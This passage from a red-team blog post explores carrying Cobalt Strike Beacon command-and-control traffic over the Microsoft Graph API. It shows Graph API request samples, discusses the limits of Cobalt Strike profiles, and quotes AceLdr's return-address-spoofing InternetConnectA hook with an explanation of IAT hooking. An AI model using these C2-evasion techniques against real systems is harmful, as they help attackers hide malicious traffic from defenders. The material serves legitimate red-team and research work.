<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">POST https:</span><span class="enlighter-c0">//graph.microsoft.com/v1.0/me/contacts</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Content-type: application/json</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-s0">"givenName"</span><span class="enlighter-text">: </span><span class="enlighter-s0">"Pavel"</span><span class="enlighter-text">,</span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-s0">"surname"</span><span class="enlighter-text">: </span><span class="enlighter-s0">"Bansky"</span><span class="enlighter-text">,</span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-s0">"emailAddresses"</span><span class="enlighter-text">: </span><span class="enlighter-g1">[</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">      </span><span class="enlighter-s0">"address"</span><span class="enlighter-text">: </span><span class="enlighter-s0">"pavelb@fabrikam.onmicrosoft.com"</span><span class="enlighter-text">,</span></div></div><div class=""><div><span class="enlighter-text">      </span><span class="enlighter-s0">"name"</span><span class="enlighter-text">: </span><span class="enlighter-s0">"Pavel Bansky"</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-g1">]</span><span class="enlighter-text">,</span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-s0">"businessPhones"</span><span class="enlighter-text">: </span><span class="enlighter-g1">[</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-s0">"+1 732 555 0102"</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">  </span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">POST https://graph.microsoft.com/v1.0/me/contacts
Content-type: application/json

{
  "givenName": "Pavel",
  "surname": "Bansky",
  "emailAddresses": [
    {
      "address": "pavelb@fabrikam.onmicrosoft.com",
      "name": "Pavel Bansky"
    }
  ],
  "businessPhones": [
    "+1 732 555 0102"
  ]
}</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">POST https://graph.microsoft.com/v1.0/me/contacts
Content-type: application/json

{
  "givenName": "Pavel",
  "surname": "Bansky",
  "emailAddresses": [
    {
      "address": "pavelb@fabrikam.onmicrosoft.com",
      "name": "Pavel Bansky"
    }
  ],
  "businessPhones": [
    "+1 732 555 0102"
  ]
}</pre>
</div>
<div role="presentation">
<div>In this case the fields seem rather limited; none of them look like good candidates for storing any significant amount of data.</div>
</div>
</div>
</div>
</div>
<p data-renderer-start-pos="16897">It’s worth taking a closer look at the real world examples of Graph API malware that were<span id="7f4df946-f6e4-44ed-8bf2-4fc69e5f9e76" data-renderer-mark="true" data-mark-type="annotation" data-mark-annotation-type="inlineComment" data-id="7f4df946-f6e4-44ed-8bf2-4fc69e5f9e76"> listed at the start of this article</span>. Interestingly most of them use a common set of Graph API methods: those related to OneDrive and SharePoint file management. Unsurprisingly, the most relevant ones are the <a class="cc-tgpl01" title="https://learn.microsoft.com/en-us/graph/api/driveitem-put-content?view=graph-rest-1.0&amp;tabs=http" href="https://learn.microsoft.com/en-us/graph/api/driveitem-put-content?view=graph-rest-1.0&amp;tabs=http" data-testid="link-with-safety" data-renderer-mark="true">Upload</a> and the <a class="cc-tgpl01" title="https://learn.microsoft.com/en-us/graph/api/driveitem-get-content?view=graph-rest-1.0&amp;tabs=http" href="https://learn.microsoft.com/en-us/graph/api/driveitem-get-content?view=graph-rest-1.0&amp;tabs=http" data-testid="link-with-safety" data-renderer-mark="true">Download</a> methods. The Upload method is described as follows:</p>
<blockquote>
<p data-renderer-start-pos="17273">Provide the contents of a new file or update the contents of an existing file in a single API call. This method only supports files up to 250 MB in size.</p>
</blockquote>
<p data-renderer-start-pos="17429">This certainly sounds like it will meet our needs. Beacon sends large output in 512KB chunks, so even if we wanted to download a 5GB file, it will be done in pieces far below the Upload method’s <span id="e2f9fee9-dfec-4573-83d6-581d676aeafa" data-renderer-mark="true" data-mark-type="annotation" data-mark-annotation-type="inlineComment" data-id="e2f9fee9-dfec-4573-83d6-581d676aeafa">250MB-per-request limit</span>. Taking a look at the example shows a very simple method, but one with a glaring problem:</p>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">PUT /me/drive/root:/FolderA/FileB.</span><span class="enlighter-m3">txt</span><span class="enlighter-text">:/content</span></div></div><div class=""><div><span class="enlighter-text">Content-Type: text/plain</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">The contents of the file goes here.</span></div></div></div><div class="enlighter-raw">PUT /me/drive/root:/FolderA/FileB.txt:/content
Content-Type: text/plain

The contents of the file goes here.</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">PUT /me/drive/root:/FolderA/FileB.txt:/content
Content-Type: text/plain

The contents of the file goes here.</pre>
</div>
</div>
</div>
</div>
</div>
<p data-renderer-start-pos="17849">The Upload method uses the HTTP PUT verb. While the Cobalt Strike profile allows the user to customize the verb that is used in http-get and http-post transactions (so one could if they wanted have a ‘GET only’ profile), the only actually supported methods are ‘GET’ and ‘POST’. Running the Cobalt Strike profile <span id="f7ed8768-bc1c-4c71-aa7d-c9b49e7adc49" data-renderer-mark="true" data-mark-type="annotation" data-mark-annotation-type="inlineComment" data-id="f7ed8768-bc1c-4c71-aa7d-c9b49e7adc49">linter, c2lint, demonstrates this.</span></p>
<div class="rich-media-item mediaSingleView-content-wrap image-center cc-g63r9w" data-layout="center" data-width="626" data-width-type="pixel" data-node-type="mediaSingle">
<div class="cc-1o234sv">
<div data-type="file" data-node-type="media" data-width="626" data-height="252" data-id="c325309b-fe69-4fe7-89e7-e7085677a6fc" data-collection="contentId-85164073" data-file-name="image-20240118-175452.png" data-file-size="40156" data-file-mime-type="image/png" data-alt="image-20240118-175452.png" data-context-id="85164073">
<div id="newFileExperienceWrapper" class="new-file-experience-wrapper cc-1k53cm" data-testid="media-card-view">
<div style="width: 636px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" class="size-medium" src="https://redsiege.com/wp-content/uploads/2024/01/04.-Graph-Strike.png" alt="‘PUT’ Method is Incompatible with Cobalt Strike Profiles" width="626" height="252"><p class="wp-caption-text">‘PUT’ Method is Incompatible with Cobalt Strike Profiles</p></div>
<div class="media-file-card-view cc-1yn77bd" data-testid="media-file-card-view" data-test-status="complete" data-test-media-name="image-20240118-175452.png" data-test-progress="1"></div>
</div>
</div>
</div>
<div class="cc-m15eub" data-media-caption="true" data-testid="media-caption" data-renderer-start-pos="18200"></div>
</div>
<p data-renderer-start-pos="18261">Even if the PUT method was supported by Cobalt Strike, it’s difficult to envision a working solution that would support more than one Beacon at a time. The URI that Beacon calls to is set in the profile, which means that each Beacon that is generated will attempt to call out to the same place. Normally, the TS is able to distinguish one Beacon from another by looking at the metadata that is sent with http-gets and the session ID that is sent with Beacon http-posts.</p>
<p data-renderer-start-pos="18733">By introducing an actual hard ‘stop’ where Beacon data (tasking or output) is at rest somewhere before it is picked up by the other party, this Beacon identifying information is lost and must be communicated some other way. To address this, some means by which to manipulate the URI of a Beacon will be necessary in order to ensure that each Beacon has their own ‘storage’ within the third party service so that multi-Beacon support can be offered by GraphStrike.</p>
<p data-renderer-start-pos="19198">Taken together, we now have a sizeable list of reasons why this idea might not be viable. The base CobaltStrike product just isn’t flexible enough to support all of the deviations from normal HTTPS C2 methodology. This doesn’t mean the dream is dead, just that we need to go deeper.</p>
<p>&amp;nbsp;</p>
<h2 id="Open-Source-Tooling-to-the-Rescue" data-renderer-start-pos="19482"><span class="ez-toc-section" id="Open_Source_Tooling_to_the_Rescue" ez-toc-data-id="#Open_Source_Tooling_to_the_Rescue"></span>Open Source Tooling to the Rescue<span class="ez-toc-section-end"></span></h2>
<p data-renderer-start-pos="19517">Looking at these blockers collectively, the common requirement I identified is that I need some method of manipulating Beacon’s behavior during runtime. This led me to finally look at Cobalt Strike <a class="cc-tgpl01" title="https://www.cobaltstrike.com/product/features/user-defined-reflective-loader" href="https://www.cobaltstrike.com/product/features/user-defined-reflective-loader" data-testid="link-with-safety" data-renderer-mark="true">User-Defined Reflective Loaders</a> (UDRLs). UDRLs provide operators the opportunity to modify how Beacon is actually loaded into memory. Crucially, it offers operators the ability to execute additional code within the process before Beacon is actually executed/calls out for the first time. Several different UDRLs are available publicly, but I focused in on Kyle Avery’s <a class="cc-tgpl01" title="https://github.com/kyleavery/AceLdr/tree/main" href="https://github.com/kyleavery/AceLdr/tree/main" data-testid="link-with-safety" data-renderer-mark="true">AceLdr</a> after noticing this in the project’s README:</p>
<blockquote>
<p data-renderer-start-pos="20138">Certain WinAPI calls are executed with a spoofed return address (InternetConnectA, NtWaitForSingleObject, RtlAllocateHeap).</p>
</blockquote>
<p data-renderer-start-pos="20264">Taking a look at the code, I found that there were custom defined functions for each of the API’s <span id="4fee418f-1256-497b-9b97-787f78845372" data-renderer-mark="true" data-mark-type="annotation" data-mark-annotation-type="inlineComment" data-id="4fee418f-1256-497b-9b97-787f78845372">mentioned</span>:</p>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-m0">SECTION</span><span class="enlighter-g1">(</span><span class="enlighter-text"> D </span><span class="enlighter-g1">)</span><span class="enlighter-text"> HINTERNET </span><span class="enlighter-m0">InternetConnectA_Hook</span><span class="enlighter-g1">(</span><span class="enlighter-text"> HINTERNET hInternet, </span></div></div><div class=""><div><span class="enlighter-text">                                               LPCSTR lpszServerName, </span></div></div><div class=""><div><span class="enlighter-text">                                               INTERNET_PORT nServerPort, </span></div></div><div class=""><div><span class="enlighter-text">                                               LPCSTR lpszUserName, </span></div></div><div class=""><div><span class="enlighter-text">                                               LPCSTR lpszPassword, </span></div></div><div class=""><div><span class="enlighter-text">                                               DWORD dwService, </span></div></div><div class=""><div><span class="enlighter-text">                                               DWORD dwFlags, </span></div></div><div class=""><div><span class="enlighter-text">                                               DWORD_PTR dwContext </span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    API     Api;</span></div></div><div class=""><div><span class="enlighter-text">    PPEB    Peb;</span></div></div><div class=""><div><span class="enlighter-text">    HANDLE  hNet;</span></div></div><div class=""><div><span class="enlighter-text">    ULONG   Size;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">RtlSecureZeroMemory</span><span class="enlighter-g1">(</span><span class="enlighter-text"> &amp;Api, </span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-text"> Api </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    Peb = </span><span class="enlighter-m0">NtCurrentTeb</span><span class="enlighter-g1">()</span><span class="enlighter-text">-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">ProcessEnvironmentBlock;</span></div></div><div class=""><div><span class="enlighter-text">    hNet = </span><span class="enlighter-m0">FindModule</span><span class="enlighter-g1">(</span><span class="enlighter-text"> H_LIB_WININET, Peb, &amp;Size </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">InternetConnectA</span><span class="enlighter-text"> = </span><span class="enlighter-m0">FindFunction</span><span class="enlighter-g1">(</span><span class="enlighter-text"> hNet, H_API_INTERNETCONNECTA </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> HINTERNET </span><span class="enlighter-g1">)</span><span class="enlighter-m0">SPOOF</span><span class="enlighter-g1">(</span><span class="enlighter-text"> Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">InternetConnectA</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                hNet, </span></div></div><div class=""><div><span class="enlighter-text">                                Size, </span></div></div><div class=""><div><span class="enlighter-text">                                hInternet, </span></div></div><div class=""><div><span class="enlighter-text">                                </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> lpszServerName </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> nServerPort </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> lpszUserName </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> lpszPassword </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> dwService </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> dwFlags </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> dwContext </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text">;</span></div></div></div><div class="enlighter-raw">SECTION( D ) HINTERNET InternetConnectA_Hook( HINTERNET hInternet, 
                                               LPCSTR lpszServerName, 
                                               INTERNET_PORT nServerPort, 
                                               LPCSTR lpszUserName, 
                                               LPCSTR lpszPassword, 
                                               DWORD dwService, 
                                               DWORD dwFlags, 
                                               DWORD_PTR dwContext )
{
    API     Api;
    PPEB    Peb;
    HANDLE  hNet;
    ULONG   Size;

    RtlSecureZeroMemory( &amp;Api, sizeof( Api ) );

    Peb = NtCurrentTeb()-&gt;ProcessEnvironmentBlock;
    hNet = FindModule( H_LIB_WININET, Peb, &amp;Size );

    Api.net.InternetConnectA = FindFunction( hNet, H_API_INTERNETCONNECTA );

    return ( HINTERNET )SPOOF( Api.net.InternetConnectA, 
                                hNet, 
                                Size, 
                                hInternet, 
                                C_PTR( lpszServerName ), 
                                C_PTR( U_PTR( nServerPort ) ), 
                                C_PTR( lpszUserName ), 
                                C_PTR( lpszPassword ), 
                                C_PTR( U_PTR ( dwService ) ), 
                                C_PTR( U_PTR( dwFlags ) ), 
                                C_PTR( U_PTR( dwContext ) ) );
};</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">SECTION( D ) HINTERNET InternetConnectA_Hook( HINTERNET hInternet,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LPCSTR lpszServerName,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;INTERNET_PORT nServerPort,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LPCSTR lpszUserName,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LPCSTR lpszPassword,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DWORD dwService,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DWORD dwFlags,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DWORD_PTR dwContext )
{
&nbsp;&nbsp;&nbsp;&nbsp;API&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Api;
&nbsp;&nbsp;&nbsp;&nbsp;PPEB&nbsp;&nbsp;&nbsp;&nbsp;Peb;
&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;&nbsp;hNet;
&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;Size;

&nbsp;&nbsp;&nbsp;&nbsp;RtlSecureZeroMemory( &amp;Api, sizeof( Api ) );

&nbsp;&nbsp;&nbsp;&nbsp;Peb = NtCurrentTeb()-&gt;ProcessEnvironmentBlock;
&nbsp;&nbsp;&nbsp;&nbsp;hNet = FindModule( H_LIB_WININET, Peb, &amp;Size );

&nbsp;&nbsp;&nbsp;&nbsp;Api.net.InternetConnectA = FindFunction( hNet, H_API_INTERNETCONNECTA );

&nbsp;&nbsp;&nbsp;&nbsp;return ( HINTERNET )SPOOF( Api.net.InternetConnectA,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hNet,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Size,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hInternet,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR( lpszServerName ),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR( U_PTR( nServerPort ) ),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR( lpszUserName ),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR( lpszPassword ),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR( U_PTR ( dwService ) ),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR( U_PTR( dwFlags ) ),&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C_PTR( U_PTR( dwContext ) ) );
};</pre>
<p>Notably, the InternetConnectA_Hook function defined above takes the exact same parameters that the real Windows API <a class="cc-tgpl01" title="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetconnecta" href="https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetconnecta" data-testid="link-with-safety" data-renderer-mark="true">InternetConnectA</a> does.</p>
</div>
</div>
</div>
</div>
</div>
<p data-renderer-start-pos="21972"><span id="2571d86a-d5f7-49a8-90f1-bd22d0d04359" data-renderer-mark="true" data-mark-type="annotation" data-mark-annotation-type="inlineComment" data-id="2571d86a-d5f7-49a8-90f1-bd22d0d04359">AceLdr</span> performs <a class="cc-tgpl01" title="https://www.ired.team/offensive-security/code-injection-process-injection/import-adress-table-iat-hooking" href="https://www.ired.team/offensive-security/code-injection-process-injection/import-adress-table-iat-hooking" data-testid="link-with-safety" data-renderer-mark="true">Import Address Table (IAT) hooking</a>, wherein certain API’s (like InternetConnectA) memory addresses are overwritten within the Beacon processes Import Address Table (IAT) and replaced with the address of a corresponding custom function. The IAT may be likened to a table of contents or index in a book, where different chapters are listed alongside the page that they start on. With IAT hooking, we are effectively changing the page number (memory address) that is associated with a chapter (API). The result is that when one of the hooked API’s is called, the IAT returns the address of AceLdr’s equivalent user-defined function instead of the real one within a Microsoft DLL, and that custom function is executed instead. For most of the API’s hooked by AceLdr, all the custom functions do is call the real API (resolved manually instead of using the IAT) with the SPOOF macro in order to implement return address spoofing.</p>
